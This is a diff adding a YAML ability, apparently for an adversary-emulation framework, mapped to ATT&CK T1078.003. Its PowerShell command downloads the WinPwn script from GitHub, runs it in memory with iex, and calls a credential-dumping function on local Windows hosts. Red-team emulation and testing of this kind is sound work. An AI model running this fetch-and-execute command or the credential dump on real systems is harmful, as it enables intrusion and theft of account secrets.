@@ -1,0 +1,18 @@
+- description: Loot local Credentials - powerhell kittie technique via function of
+    WinPwn
+  id: 2c078668-c470-edc7-6c94-c695782fbcfa
+  name: WinPwn - Loot local Credentials - powerhell kittie
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
+          obfuskittiedump -consoleoutput -noninteractive
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: multiple
+  technique:
+    attack_id: T1078.003
+    name: 'Valid Accounts: Local Accounts'
